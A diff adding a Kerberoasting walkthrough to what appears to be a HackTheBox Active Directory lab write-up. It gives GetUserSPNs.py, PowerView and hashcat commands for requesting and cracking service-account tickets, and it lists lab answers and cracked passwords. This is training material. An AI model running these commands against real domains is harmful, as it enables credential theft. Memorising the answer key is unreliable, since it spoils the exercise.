@@ -17,6 +17,9 @@
     1. [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
     2. [Credentialed Enumeration - from Windows](#credentialed-enumeration---from-windows)
     3. [Living Off the Land](#living-off-the-land)
+6. [Cooking with Fire](#cooking-with-fire)
+    1. [Kerberoasting - from Linux](#kerberoasting---from-linux)
+    2. [Kerberoasting - from Windows](#kerberoasting---from-windows)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -241,3 +244,65 @@
     dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr sAMAccountName description
     ```
     The answer is `HTB{LD@P_I$_W1ld} `.
+
+## Cooking with Fire
+### Kerberoasting - from Linux
+#### Tools
+1. GetUserSPNs.py
+#### Challenges
+1. Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.
+
+    We can use `GetUserSPNs.py` to retrive TGS ticket for SAPService.
+
+    ```bash
+    GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile SAPService_tgs
+    ```
+
+    ![alt text](Assets/KerberoastingLinux1.png)
+
+    After that, we can use hashcat with mode 13100.
+
+    ```bash
+    hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt --force
+    ```
+    The answer is `!SapperFi2`.
+
+2. What powerful local group on the Domain Controller is the SAPService user a member of?
+    
+    We can answer this based on the previous image output. The answer is `Account Operators`.
+
+### Kerberoasting - from Windows
+#### Tools
+1. PowerView.ps1
+#### Challenges
+1. What is the name of the service account with the SPN 'vmware/inlanefreight.local'?
+
+    First, we can use `PowerView.ps1` to get the list of service account.
+
+    ```powershell
+    Import-Module .\PowerView.ps1
+    Get-DomainUser * -spn | select samaccountname
+    ```
+
+    ![alt text](Assets/KerberoastingWindows1.png)
+
+    Then we can use `PowerView.ps1` to target specific user until we find SPN `vmware/inlanefreight.local`.
+
+    ```powershell
+    Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat
+    ``` 
+    ![alt text](Assets/KerberoastingWindows2.png)
+
+    The answer is `svc_vmwaresso`.
+
+2. Crack the password for this account and submit it as your answer.
+
+    We can save the hash in the previous image. Then we can use hashcat to crack it.
+
+    ```bash
+    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `Virtual01`.
+
+
+
